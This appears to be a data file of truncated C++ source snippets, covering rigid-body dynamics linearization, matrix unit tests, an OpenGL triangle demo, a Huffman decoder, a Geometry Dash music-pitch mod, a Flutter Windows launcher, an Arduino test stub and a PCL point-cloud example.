std::move(other._phase_handler->clone());\n\n        // Terrain\n        _terrain = std::move(other._terrain->clone());\n\n        // General state\n        _mass = other._mass;\n        _inertia = other._inertia;\n        _inertia_inv = other._inertia_inv;\n\n        // Global variables\n        _dt = other._dt;\n        _g = other._g;\n        _gravity = other._gravity;\n\n        // Helper variables\n        _last_qp_result_valid = other._last_qp_result_valid;\n\n        return *this;\n    }\n\n    void SingleRigidBodyDynamics::set_sim_data(double dt, double gravity)\n    {\n        _dt = dt;\n        _g = std::abs(gravity);\n        _gravity = Vec3d(0, 0, -_g);\n    }\n\n    void SingleRigidBodyDynamics::set_inertial_data(double mass, const RotMat& inertia)\n    {\n        _mass = mass;\n        _inertia = inertia;\n        _inertia_inv = inertia.inverse();\n    }\n\n    void SingleRigidBodyDynamics::set_feet_data(const std::vector<Vec3d>& feet_ref_positions, const std::vector<Vec3d>& feet_min_bounds, const std::vector<Vec3d>& feet_max_bounds)\n    {\n        assert((_feet_ref_positions.size() == _feet_min_bounds.size() == _feet_max_bounds.size()) && \"Not consistent number of feet!\");\n        _feet_ref_positions = feet_ref_positions;\n        _feet_min_bounds = feet_min_bounds;\n        _feet_max_bounds = feet_max_bounds;\n    }\n\n    void SingleRigidBodyDynamics::set_data(const Vec3d& base_position, const Vec3d& base_velocity, const RotMat& base_orientation, const Vec3d& base_angular_velocity, const std::vector<Vec3d>& feet_positions, const std::vector<size_t>& feet_phases)\n    {\n        // Base-related\n        _base_position = base_position;\n        _base_vel = base_velocity;\n        _base_orientation = base_orientation;\n        _base_angular_vel = base_angular_velocity;\n\n        // Feet-related\n        assert(feet_positions.size() == _feet_ref_positions.size() && feet_phases.size() == _feet_ref_positions.size() && \"Wrong number of feet!\");\n        _feet_positions = feet_positions;\n        _feet_phases = feet_phases;\n    }\n\n    void SingleRigidBodyDynamics::set_base_position(const Vec3d& pos) { _base_position = pos; }\n\n    void SingleRigidBodyDynamics::set_base_velocity(const Vec3d& vel) { _base_vel = vel; }\n\n    void SingleRigidBodyDynamics::set_base_orientation(const RotMat& rot) { _base_orientation = rot; }\n\n    void SingleRigidBodyDynamics::set_base_angular_velocity(const Vec3d& ang_vel) { _base_angular_vel = ang_vel; }\n\n    void SingleRigidBodyDynamics::set_feet_positions(const std::vector<Vec3d>& feet_positions)\n    {\n        assert(feet_positions.size() == _feet_ref_positions.size() && \"Wrong number of feet!\");\n        _feet_positions = feet_positions;\n    }\n\n    void SingleRigidBodyDynamics::set_feet_phases(const std::vector<size_t>& feet_phases)\n    {\n        assert(feet_phases.size() == _feet_ref_positions.size() && \"Wrong number of feet!\");\n        _feet_phases = feet_phases;\n    }\n\n    std::tuple<Matrix, Matrix, Vector> SingleRigidBodyDynamics::linearize() const\n    {\n        const size_t n_dim = 9;\n        const size_t n_feet = _feet_ref_positions.size();\n        const size_t m_dim = n_feet * 3;\n\n        Matrix L_c = skew(_base_angular_vel) * (_inertia - skew(_inertia * _base_angular_vel)); // optimal gain\n        // State Space Model X_n+1 = A*X_n + B*U_n\n        // Define A Matrix\n        Matrix A = Matrix::Zero(n_dim, n_dim);\n        // Block of size (p,q), starting at (i,j)\tmatri_block(i,j,p,q); matri_block<p,q>(i,j);\n        A.block(0, 0, 3, 3) = Matrix::Identity(3, 3);\n        A.block(0, 3, 3, 3) = Matrix::Identity(3, 3) * _dt;\n        A.block(3, 3, 3, 3) = Matrix::Identity(3, 3);\n        A.block(6, 6, 3, 3) = Matrix::Identity(3, 3) - _dt * _inertia_inv * L_c;\n\n        // Define B Matrix\n        Matrix B = Matrix::Zero(n_dim, m_dim);\n        B.block(0, 0, 3, 3 * n_feet) = kron((((0.5 * _",
    "#include \"single_thread_matrix_calculation.h\"\n\n#include <gtest/gtest.h>\n\n#include <cmath>\n\n#include \"matrix.h\"\n\nnamespace mca {\nnamespace test {\nclass TestSinglThreadCalculation : public testing::Test {\nprotected:\n    Matrix<> one, negOne, output, a, b, c, d, sym, antisym;\n    Matrix<int> e;\n\n    void SetUp() override {\n        one     = Matrix<>({3, 3}, 1);\n        negOne  = Matrix<>({3, 3}, -1);\n        a       = Matrix<>({{0, 0, 0}, {1, 1, 1}, {2, 2, 2}});\n        b       = Matrix<>({{1, 0, 0}, {0, 1, 0}, {0, 0, 1}});\n        c       = Matrix<>({{1, 2, 3}, {4, 5, 6}, {7, 8, 9}});\n        d       = Matrix<>({{0, 0, 0}, {1, 1, 1}, {2, 2, 2}});\n        e       = Matrix<int>({{1, 2, 3}, {2, 3, 4}, {6, 6, 6}});\n        sym     = Matrix<>({{1, 2. / 3, 3. / 5}, {4. / 6, 3, 8. / 6}, {1.5 / 2.5, 4. / 3, 5}});\n        antisym = Matrix<>({{1, -2. / 3, -3. / 5}, {4. / 6, 3, -8. / 6}, {1.5 / 2.5, 4. / 3, 5}});\n    }\n\n    void TearDown() override {}\n};\n\nTEST_F(TestSinglThreadCalculation, powNumberWholeMatrix) {\n    output = Matrix<>({3, 3}, 0);\n    powNumberSingleThread(a, 2, output, 0, 0, a.getShape());\n    Matrix<> result = Matrix<>({{0, 0, 0}, {1, 1, 1}, {4, 4, 4}});\n    std::cout << output.rows() << output.columns() << std::endl;\n    std::cout << result.rows() << result.columns() << std::endl;\n    ASSERT_TRUE(equalSingleThread(output, result, 0, 0, output.getShape()));\n}\n\nTEST_F(TestSinglThreadCalculation, powNumberSubMatrix) {\n    output = Matrix<>({3, 3}, -1);\n    powNumberSingleThread(c, 2, output, 0, 1, {2, 2});\n    Matrix<> result = Matrix<>({{-1, 4, 9}, {-1, 25, 36}, {-1, -1, -1}});\n    ASSERT_TRUE(equalSingleThread(output, result, 0, 0, output.getShape()));\n}\n\nTEST_F(TestSinglThreadCalculation, numberPowWholeMatrix) {\n    output = Matrix<>({3, 3}, 0);\n    numberPowSingleThread(2, a, output, 0, 0, a.getShape());\n    Matrix<> result = Matrix<>({{1, 1, 1}, {2, 2, 2}, {4, 4, 4}});\n    ASSERT_TRUE(equalSingleThread(output, result, 0, 0, output.getShape()));\n}\n\nTEST_F(TestSinglThreadCalculation, numberPowSubMatrix) {\n    output = Matrix<>({3, 3}, -1);\n    numberPowSingleThread(2, c, output, 0, 1, {2, 2});\n    Matrix<> result({{-1, 4, 8}, {-1, 32, 64}, {-1, -1, -1}});\n    ASSERT_TRUE(equalSingleThread(output, result, 0, 0, output.getShape()));\n}\n\nTEST_F(TestSinglThreadCalculation, lessWholeMatrix) {\n    ASSERT_TRUE(lessSingleThread(a, c, 0, 0, a.getShape()));\n    ASSERT_FALSE(lessSingleThread(a, b, 0, 0, a.getShape()));\n}\n\nTEST_F(TestSinglThreadCalculation, lessSubMatrix) {\n    ASSERT_TRUE(lessSingleThread(a, c, 1, 0, {2, 3}));\n    ASSERT_FALSE(lessSingleThread(a, b, 1, 0, {2, 2}));\n}\n\nTEST_F(TestSinglThreadCalculation, equalWholeMatrix) {\n    ASSERT_TRUE(equalSingleThread(a, d, 0, 0, a.getShape()));\n    ASSERT_FALSE(equalSingleThread(a, b, 0, 0, a.getShape()));\n}\n\nTEST_F(TestSinglThreadCalculation, equalSubMatrix) {\n    ASSERT_TRUE(equalSingleThread(a, d, 1, 0, {2, 2}));\n    ASSERT_FALSE(equalSingleThread(a, b, 1, 0, {2, 2}));\n}\n\nTEST_F(TestSinglThreadCalculation, lessEqualWholeMatrix) {\n    ASSERT_TRUE(lessEqualSingleThread(a, c, 0, 0, a.getShape()));\n    ASSERT_TRUE(lessEqualSingleThread(a, d, 0, 0, a.getShape()));\n    ASSERT_FALSE(lessEqualSingleThread(c, b, 0, 0, a.getShape()));\n}\n\nTEST_F(TestSinglThreadCalculation, lessEqualSubMatrix) {\n    ASSERT_TRUE(lessEqualSingleThread(a, c, 0, 0, {2, 3}));\n    ASSERT_TRUE(lessEqualSingleThread(a, d, 0, 0, {2, 3}));\n    ASSERT_FALSE(lessEqualSingleThread(c, a, 0, 0, {2, 3}));\n}\n\nTEST_F(TestSinglThreadCalculation, greaterWholeMatrix) {\n    ASSERT_TRUE(greaterSingleThread(c, a, 0, 0, c.getShape()));\n    ASSERT_FALSE(greaterSingleThread(d, a, 0, 0, d.getShape()));\n    ASSERT_FALSE(greaterSingleThread(d, b, 0, 0, b.getShape()));\n}\n\nTEST_F(TestSinglThreadCalculation, greaterSubMatrix) {\n    ASSERT_TRUE(greaterSingleThread(c, a, 0, 1, {2, 2}));\n    ASSERT_FALSE(greaterSingleThread(a, b, 0, 1, {2, 2}));\n    ASSERT_FALSE(greaterSingleThread(a, d, 0, 1, {2, 2}));\n}\n\nTEST_F(TestSinglThreadCalculation, greaterEqualWholeMatrix) {\n    ASSERT_TRUE(greaterEqualSingleThread(a, d, 0, 0, a.getShape()));\n    ASSERT_TRUE(greaterEqualSingleThread(c, a, 0, 0, c.getShape()));\n    ASSERT_FALSE(greaterEqualSingleThread(b, c, 0, 0, b.getShape()));\n}\n\nTEST_F(TestSinglThreadCalculation, greaterEqualSubMatrix) {\n    ASSERT_TRUE(greaterEqualSingleThread(a, d, 0, 1, {3, 2}));\n    ASSERT_TRUE(greaterEqualSingleThread(c, b, 0, 1, {3, 2}));\n    ASSERT_FALSE(greaterEqualSingleThread(b, c, 0, 1, {3, 2}));\n}\n\nTEST_F(TestSinglThreadCalculation, notEqualWholeMatrix) {\n    ASSERT_TRUE(notEqualSingleThread(a, c, 0, 0, a.getShape()));\n    ASSERT_FALSE(notEqualSingleThread(a, d, 0, 0, a.getShape()));\n}\n\nTEST_F(TestSinglThreadCalculation, notEqualSubMatrix) {\n    ASSERT_TRUE(notEqualSingleThread(a, c, 1, 1, {2, 1}));\n    ASSERT_FALSE(notEqualSingleThread(a, d, 1, 1, {2, 1}));\n}\n\nTEST_F(TestSinglThreadCalculation, addNumberWholeMatrix) {\n    output = Matrix<>({3, 3}, -1);\n    addSingleThread(2, a, output, 0, 0, a.",
    "#include <vector>\n#include <glad/glad.h>\n#include <glfw/glfw3.h>\n#include <spdlog/spdlog.h>\n#include <shader.hpp>\n\nconstexpr unsigned int WindowWidth = 800;\nconstexpr unsigned int WindowHeight = 600;\n\nstatic void framebuffer_size_callback(GLFWwindow* window, int width, int height);\nstatic void process_input(GLFWwindow *window);\n\nint main() {\n    spdlog::set_level(spdlog::level::debug);\n\n    glfwInit();\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n#ifdef __APPLE__\n    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);\n#endif\n\n    GLFWwindow* window = glfwCreateWindow(WindowWidth, WindowHeight, \"Triangle\", nullptr, nullptr);\n    if (!window) {\n        spdlog::error(\"Failed to create GLFW window!\");\n        glfwTerminate();\n        return -1;\n    }\n    glfwMakeContextCurrent(window);\n    glfwSetFramebufferSizeCallback(window, framebuffer_size_callback);\n    if (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress)) {\n        spdlog::error(\"Failed to initialize GLAD!\");\n        return -1;\n    }\n\n    lgl::Shader shader;\n    shader.add(lgl::Shader::Type::Vertex, \"./vertexShader.glsl\");\n    shader.add(lgl::Shader::Type::Fragment, \"./fragShader.glsl\");\n    shader.link();\n\n    std::vector<GLfloat> vertices {\n        0.5f, -0.5f, 0.0f, 1.f, 0.f, 0.f,\n        -0.5f, -0.5f, 0.0f, 0.f, 1.f, 0.f,\n        0.0f, 0.5f, 0.0f, 0.f, 0.f, 1.f,\n    };\n\n    unsigned int vbo, vao;\n    glGenVertexArrays(1, &vao);\n    glGenBuffers(1, &vbo);\n\n    glBindVertexArray(vao);\n    glBindBuffer(GL_ARRAY_BUFFER, vbo);\n    glBufferData(GL_ARRAY_BUFFER, vertices.size() * sizeof(*vertices.data()), vertices.data(), GL_STATIC_DRAW);\n\n    auto posLoc = shader.get_attribute_location(\"aPos\");\n    glVertexAttribPointer(posLoc, 3, GL_FLOAT, GL_FALSE, 6 * sizeof(*vertices.data()), (void *) 0);\n    glEnableVertexAttribArray(posLoc);\n    auto colorLoc = shader.get_attribute_location(\"aColor\");\n    glVertexAttribPointer(colorLoc, 3, GL_FLOAT, GL_FALSE, 6 * sizeof(*vertices.data()), (void *) (3 * sizeof(*vertices.data())));\n    glEnableVertexAttribArray(colorLoc);\n\n    while (!glfwWindowShouldClose(window)) {\n        process_input(window);\n\n        glClearColor(0.2f, 0.3f, 0.3f, 1.0f);\n        glClear(GL_COLOR_BUFFER_BIT);\n\n        shader.use();\n        glBindVertexArray(vao);\n        glDrawArrays(GL_TRIANGLES, 0, 3);\n\n        glfwSwapBuffers(window);\n        glfwPollEvents();\n    }\n\n    glDeleteVertexArrays(1, &vao);\n    glDeleteBuffers(1, &vbo);\n\n    glfwTerminate();\n    return 0;\n}\n\n// process all input: query GLFW whether relevant keys are pressed/released this frame and react accordingly\n// ---------------------------------------------------------------------------------------------------------\nvoid process_input(GLFWwindow *window)\n{\n    if (glfwGetKey(window, GLFW_KEY_ESCAPE) == GLFW_PRESS)\n        glfwSetWindowShouldClose(window, true);\n}\n\n// glfw: whenever the window size changed (by OS or user resize) this callback function executes\n// ---------------------------------------------------------------------------------------------\nvoid framebuffer_size_callback(GLFWwindow* window, int width, int height)\n{\n    // make sure the viewport matches the new window dimensions; note that width and\n    // height will be significantly larger than specified on retina displays.\n    glViewport(0, 0, width, height);\n}\n",
    "#include <iostream>\n#include <vector>\n#include <unordered_map>\n#include <bitset>\n#include <algorithm>\n#include <fstream>\n#include <string>\n#include <queue>\n#include <iomanip>\n#include \"kaitai/kaitaistream.h\"\n#include \"column_data_dictionary.h\"\n\n// Huffman Tree Node definition\nstruct HuffmanTree {\n    uint8_t c;\n    HuffmanTree* left;\n    HuffmanTree* right;\n\n    HuffmanTree(uint8_t c = 0) : c(c), left(nullptr), right(nullptr) {}\n    ~HuffmanTree() {\n        delete left;\n        delete right;\n    }\n};\n\nstd::string iso88591_to_utf8(uint8_t code) {\n    std::string utf8;\n    if (code >= 0x80) {\n        utf8.push_back(static_cast<char>(0xC2 + (code > 0xBF)));\n        utf8.push_back(static_cast<char>((code & 0x3F) + 0x80));\n    } else {\n        utf8.push_back(static_cast<char>(code));\n    }\n    return utf8;\n}\n// Function to generate the full 256-byte Huffman array from the compact 128-byte encode_array\nstd::vector<uint8_t> decompress_encode_array(const std::vector<uint8_t>& compressed) {\n    std::vector<uint8_t> full_array(256, 0);\n\n    for (size_t i = 0; i < compressed.size(); i++) {\n        uint8_t byte = compressed[i];\n        full_array[2 * i] = byte & 0x0F;         // Lower nibble\n        full_array[2 * i + 1] = (byte >> 4) & 0x0F; // Upper nibble\n    }\n\n    return full_array;\n}\n\n// Function to generate Huffman codes based on codeword lengths\nstd::unordered_map<uint8_t, std::string> generate_codes(const std::vector<uint8_t>& lengths) {\n    std::unordered_map<uint8_t, std::string> codes;\n    std::vector<std::pair<uint8_t, uint8_t>> sorted_lengths;\n\n    // Collect only the non-zero lengths and their associated symbols\n    for (auto i = 0; i < 256; i++) {\n        if (lengths[i] != 0){\n            sorted_lengths.emplace_back(lengths[i], i);\n        }\n    }\n    // Sort by length first, then by character\n    std::sort(sorted_lengths.begin(), sorted_lengths.end(), [](const auto& a, const auto& b) {\n        return a.first != b.first ? a.first < b.first : a.second < b.second;\n    });\n\n    int code = 0;\n    int last_length = 0;\n\n    for (const auto& [length, character] : sorted_lengths) {\n        if (last_length != length) {\n            code <<= (length - last_length); // Shift code by difference in lengths\n            last_length = length;\n        }\n\n        // Generate the code string representation up to 15 bits\n        codes[character] = std::bitset<15>(code).to_string().substr(15 - length);\n        code++;\n    }\n\n    return codes;\n}\n\n// Print Huffman codes\nvoid print_huffman_codes(const std::unordered_map<uint8_t, std::string>& codes) {\n    std::cout << \"Huffman Codes:\\n\";\n    for (const auto& [character, code] : codes) {\n        std::cout << (int)character <<\" - \" << character << \": \" << code << '\\n';\n        }\n}\n\n// Build Huffman tree based on generated codes\nHuffmanTree* build_huffman_tree(const std::vector<uint8_t>& encode_array) {\n    auto codes = generate_codes(encode_array);\n// print_huffman_codes(codes);\n    HuffmanTree* root = new HuffmanTree;\n\n    for (const auto& [character, code] : codes) {\n        HuffmanTree* node = root;\n        for (char bit : code) {\n            if (bit == '0') {\n                if (!node->left) node->left = new HuffmanTree;\n                node = node->left;\n            } else {\n                if (!node->right) node->right = new HuffmanTree;\n                node = node->right;\n            }\n        }\n        node->c = character;\n    }\n\n    return root;\n}\n// Decode a bitstream from start to end bit positions using the Huffman tree\nstd::string decode_substring(const std::string& bitstream, HuffmanTree* tree, uint32_t start_bit, uint32_t end_bit) {\n    std::string result;\n    const HuffmanTree* node = tree;\n    uint32_t total_bits = end_bit - start_bit;\n\n    // Adjust bit position calculation for little endian byte order\n    for (uint32_t i = 0; i < total_bits; ++i) {\n        uint32_t bit_pos = start_bit + i;\n        uint32_t byte_pos = bit_pos / 8;\n        uint32_t bit_offset = bit_pos % 8;\n\n        // Convert byte index for little endian (pair-wise)\n        byte_pos = (byte_pos & ~0x01) + (1 - (byte_pos & 0x01));\n\n        if (!node->left && !node->right) {\n            result += iso88591_to_utf8(node->c);\n            node = tree; // Reset to the root node\n        }\n\n        // Traverse the Huffman tree based on the current bit\n        if (bitstream[byte_pos] & (1 << (7 - bit_offset))) {  // Adjusting bit offset to read from MSB to LSB\n            node = node->right;\n        } else {\n            node = node->left;\n        }\n    }\n\n    // Append the last character if the final node is a leaf\n    if (!node->left && !node->right) {\n        result += iso88591_to_utf8(node->c);\n    }\n\n    return result;\n}\n\n\n// Print Huffman tree in a readable format\nvoid print_huffman_tree(HuffmanTree* node, int indent = 0) {\n    if (node == nullptr) return;\n\n    if (node->right) print_huffman_tree(node->right, indent + 4);\n\n    if (indent) std::cout << std::setw(indent) << ' ';\n    if (!node->left && ",
    "#include <Geode/Geode.hpp>\n#include <Geode/modify/PlayLayer.hpp>\n\nusing namespace geode::prelude;\n\n// OBJECT IDS | slow = 200 0.7| normal speed = 201, 0.9 | 2x = 202 1.1| 3x = 203 1.3| 4x = 1334 1.6| m_levelString\n\nstd::vector<int> slowSpeed;\nstd::vector<int> normalSpeed;\nstd::vector<int> fastSpeed;\nstd::vector<int> fasterSpeed;\nstd::vector<int> fastestSpeed;\n\nstd::vector<std::string> splitString(const std::string& s, char delimiter) {\n    std::vector<std::string> tokens;\n    std::istringstream ss(s);\n    std::string token;\n    while (std::getline(ss, token, delimiter)) {\n        tokens.push_back(token); \n    }\n    return tokens;\n}\n\nvoid cleanVector(std::vector<int>& vector) {\n\tstd::sort(vector.begin(), vector.end());\n\tauto uniquePositions = std::unique(vector.begin(), vector.end());\n\tvector.erase(uniquePositions, vector.end());\n}\n\nclass $modify(ResetMusicLayer, PlayLayer) {\n\nfloat pitch = 1.0f;\nfloat supposedSpeed;\nbool needingOfPitch = false;\n\n\tbool init(GJGameLevel *level, bool useReplay, bool dontCreateObjects) {\n\t\tbool result = PlayLayer::init(level, useReplay, dontCreateObjects);\n\t\tm_fields->supposedSpeed = 0.0f;\n\t\tauto fmod = FMODAudioEngine::sharedEngine();\n\t\tFMOD_RESULT fResult;\n\t\tFMOD::ChannelGroup* mGroup = nullptr;\n\t\tfResult = fmod->m_system->getMasterChannelGroup(&mGroup);\n\t\tResetMusicLayer::quickRestart();\n\t\tgd::string levelString = m_level->m_levelString;\n\t\tstd::string decompString = ZipUtils::decompressString(levelString, true, 0);\n\t\tstd::vector<std::string> leveldata = splitString(decompString, ';');\n\t\tslowSpeed.clear(); normalSpeed.clear(); fastSpeed.clear(); fasterSpeed.clear(); fastestSpeed.clear(); // real ones use 1 line to save 5\n\n\t\tm_fields->supposedSpeed = 0;\n\t\tif (m_fields->pitch != 1.0f) mGroup->setPitch(1.0f);\n\t\tint pixelBuffer = Mod::get()->getSettingValue<int64_t>(\"pixelBuffer\");\n\n\t\tfor (int i = 0; i < leveldata.size(); i++) {\n\t\t\tif (leveldata[i].substr(0, 6) == \"1,200,\") { \n\t\t\t\t\tstd::vector<std::string> objectXPOS = splitString(leveldata[i], ','); \n\t\t\t\t\tslowSpeed.push_back(stoi(objectXPOS[3]) - pixelBuffer); \n\t\t\t\t}\n\t\t\telse if (leveldata[i].substr(0, 6) == \"1,201,\") { \n\t\t\t\t\tstd::vector<std::string> objectXPOS = splitString(leveldata[i], ','); \n\t\t\t\t\tnormalSpeed.push_back(stoi(objectXPOS[3]) - pixelBuffer);\n\t\t\t\t}\n\t\t\telse if (leveldata[i].substr(0, 6) == \"1,202,\") { \n\t\t\t\t\tstd::vector<std::string> objectXPOS = splitString(leveldata[i], ',');\n\t\t\t\t\tfastSpeed.push_back(stoi(objectXPOS[3]) - pixelBuffer); \n\t\t\t\t}\n\t\t\telse if (leveldata[i].substr(0, 6) == \"1,203,\") { \n\t\t\t\t\tstd::vector<std::string> objectXPOS = splitString(leveldata[i], ',');\n\t\t\t\t\tfasterSpeed.push_back(stoi(objectXPOS[3]) - pixelBuffer); \n\t\t\t\t}\n\t\t\telse if (leveldata[i].substr(0, 7) == \"1,1334,\")  { \n\t\t\t\t\tstd::vector<std::string> objectXPOS = splitString(leveldata[i], ','); \n\t\t\t\t\tfastestSpeed.push_back(stoi(objectXPOS[3]) - pixelBuffer); // 40 is accounted for the start of the hitbox\n\t\t\t\t}\t\n\t\t}\n\t\tcleanVector(slowSpeed); cleanVector(normalSpeed); cleanVector(fastSpeed); cleanVector(fasterSpeed); cleanVector(fastestSpeed);\n\t\tlog::info(\"{} {} {} {} {}\", slowSpeed, normalSpeed, fastSpeed, fasterSpeed, fastestSpeed);\n\t\treturn result;\n\t}\n\n\tvoid postUpdate(float p0) {\n\t\tPlayLayer::postUpdate(p0);\n\t\tauto fmod = FMODAudioEngine::sharedEngine();\n\t\tFMOD_RESULT result;\n\t\tFMOD::ChannelGroup* mGroup = nullptr;\n\t\tresult = fmod->m_system->getMasterChannelGroup(&mGroup);\n\t\tif (m_fields->supposedSpeed == 0.0f) m_fields->supposedSpeed = m_player1->m_playerSpeed; // YEAH BABY INIT WOOO\n\t\tif (m_fields->needingOfPitch) {\n\t\t\tfor (int i = 0; i < slowSpeed.size(); i++) {\n\t\t\t\tif (std::abs(floor(m_player1->getPositionX()) - slowSpeed[i]) <= 5) {\n\t\t\t\t\tlog::debug(\"{} {} 0.7 {}\", floor(m_player1->getPositionX()), m_player1->m_playerSpeed, slowSpeed[i]);\n\t\t\t\t\tm_fields->supposedSpeed = 0.7;\n\t\t\t\t\tm_fields->pitch = m_player1->m_playerSpeed / 0.7;\n\t\t\t\t}\n\t\t\t}\n\t\t\tfor (int i = 0; i < normalSpeed.size(); i++) {\n\t\t\t\tif (std::abs(floor(m_player1->getPositionX()) - normalSpeed[i]) <= 5) {\n\t\t\t\t\tlog::debug(\"{} {} 0.9 {}\", floor(m_player1->getPositionX()), m_player1->m_playerSpeed, normalSpeed[i]);\n\t\t\t\t\tm_fields->supposedSpeed = 0.9;\n\t\t\t\t\tm_fields->pitch = m_player1->m_playerSpeed / 0.9;\n\t\t\t\t}\n\t\t\t}\n\t\t\tfor (int i = 0; i < fastSpeed.size(); i++) {\n\t\t\t\tif (std::abs(floor(m_player1->getPositionX()) - fastSpeed[i]) <= 5) {\n\t\t\t\t\tlog::debug(\"{} {} 1.1 {}\", floor(m_player1->getPositionX()), m_player1->m_playerSpeed, fastSpeed[i]);\n\t\t\t\t\tm_fields->supposedSpeed = 1.1;\n\t\t\t\t\tm_fields->pitch = m_player1->m_playerSpeed / 1.1;\n\t\t\t\t}\n\t\t\t}\n\t\t\tfor (int i = 0; i < fasterSpeed.size(); i++) {\n\t\t\t\tif (std::abs(floor(m_player1->getPositionX()) - fasterSpeed[i]) <= 5) {\n\t\t\t\t\tlog::debug(\"{} {} 1.3 {}\", floor(m_player1->getPositionX()), m_player1->m_playerSpeed, fasterSpeed[i]);\n\t\t\t\t\tm_fields->supposedSpeed = 1.3;\n\t\t\t\t\tm_fields->pitch = m_player1->m_playerSpeed / 1.3;\n\t\t\t\t}\n\t\t\t}\n\t\t\tfor (int i = 0; i < fastestSpeed.size(); i++) {\n\t\t\t\tif (std::abs(floor(m_player1->getPositionX()) - fastestSpeed[",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"weather_view_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//\n//    FILE: unit_test_001.cpp\n//  AUTHOR: Rob Tillaart\n//    DATE: 2023-06-28\n// PURPOSE: unit tests for Smooth library\n//          https://github.com/RobTillaart/SIMON\n//\n\n\n// supported assertions\n// ----------------------------\n// assertEqual(expected, actual);               // a == b\n// assertNotEqual(unwanted, actual);            // a != b\n// assertComparativeEquivalent(expected, actual);    // abs(a - b) == 0 or (!(a > b) && !(a < b))\n// assertComparativeNotEquivalent(unwanted, actual); // abs(a - b) > 0  or ((a > b) || (a < b))\n// assertLess(upperBound, actual);              // a < b\n// assertMore(lowerBound, actual);              // a > b\n// assertLessOrEqual(upperBound, actual);       // a <= b\n// assertMoreOrEqual(lowerBound, actual);       // a >= b\n// assertTrue(actual);\n// assertFalse(actual);\n// assertNull(actual);\n\n// // special cases for floats\n// assertEqualFloat(expected, actual, epsilon);    // fabs(a - b) <= epsilon\n// assertNotEqualFloat(unwanted, actual, epsilon); // fabs(a - b) >= epsilon\n// assertInfinity(actual);                         // isinf(a)\n// assertNotInfinity(actual);                      // !isinf(a)\n// assertNAN(arg);                                 // isnan(a)\n// assertNotNAN(arg);                              // !isnan(a)\n\n\n#include <ArduinoUnitTests.h>\n\n#include \"Arduino.h\"\n#include \"SmartPin.h\"\n\n\nunittest_setup()\n{\n  fprintf(stderr, \"Arduino SmartPin library\\n\");\n}\n\n\nunittest_teardown()\n{\n}\n\n\nunittest(test_constructor)\n{\n  // assertEqual(42, sm.get_window());\n  // assertEqual(0, sm.get_count());\n  // assertEqualFloat(0, sm.get_avg(), 0.0001);\n\n  // Smooth sm0(5, 0, 0);\n  // assertEqual(5, sm0.get_window());\n  // assertEqual(0, sm0.get_count());\n  // assertEqualFloat(0, sm0.get_avg(), 0.0001);\n\n  // Smooth sm1(7, 20);\n  // assertEqual(7, sm1.get_window());\n  // assertEqual(20, sm1.get_count());\n  // assertEqualFloat(0, sm0.get_avg(), 0.0001);\n\n  // Smooth sm2(15, 25, 10);\n  // assertEqual(15, sm2.get_window());\n  // assertEqual(25, sm2.get_count());\n  // assertEqualFloat(10, sm2.get_avg(), 0.0001);\n}\n\n\nunittest_main()\n\n\n//  -- END OF FILE --\n\n",
    "\n//https://pcl.readthedocs.io/projects/tutorials/en/master/concatenate_clouds.html#concatenate-clouds\n//\u5bf9\u4e24\u4e2a\u70b9\u4e91\u8fdb\u884c\u62fc\u63a5\n#include <iostream>\n#include <pcl/point_types.h>\n#include <pcl/common/io.h> // for concatenateFields\n\nint\nmain(int argc, char** argv)\n{\n    if (argc != 2)\n    {\n        std::cerr << \"please specify command line arg '-f' or '-p'\" << std::endl;\n        exit(0);\n    }\n    pcl::PointCloud<pcl::PointXYZ> cloud_a, cloud_b, cloud_c;\n    pcl::PointCloud<pcl::Normal> n_cloud_b;\n    pcl::PointCloud<pcl::PointNormal> p_n_cloud_c;\n\n    // Fill in the cloud data\n    cloud_a.width = 5;\n    cloud_a.height = cloud_b.height = n_cloud_b.height = 1;\n    cloud_a.resize(cloud_a.width * cloud_a.height);\n    if (strcmp(argv[1], \"-p\") == 0)\n    {\n        cloud_b.width = 3;\n        cloud_b.resize(cloud_b.width * cloud_b.height);\n    }\n    else {\n        n_cloud_b.width = 5;\n        n_cloud_b.resize(n_cloud_b.width * n_cloud_b.height);\n    }\n\n    for (std::size_t i = 0; i < cloud_a.size(); ++i)\n    {\n        cloud_a[i].x = 1024 * rand() / (RAND_MAX + 1.0f);\n        cloud_a[i].y = 1024 * rand() / (RAND_MAX + 1.0f);\n        cloud_a[i].z = 1024 * rand() / (RAND_MAX + 1.0f);\n    }\n    if (strcmp(argv[1], \"-p\") == 0)\n        for (std::size_t i = 0; i < cloud_b.size(); ++i)\n        {\n            cloud_b[i].x = 1024 * rand() / (RAND_MAX + 1.0f);\n            cloud_b[i].y = 1024 * rand() / (RAND_MAX + 1.0f);\n            cloud_b[i].z = 1024 * rand() / (RAND_MAX + 1.0f);\n        }\n    else\n        for (std::size_t i = 0; i < n_cloud_b.size(); ++i)\n        {\n            n_cloud_b[i].normal[0] = 1024 * rand() / (RAND_MAX + 1.0f);\n            n_cloud_b[i].normal[1] = 1024 * rand() / (RAND_MAX + 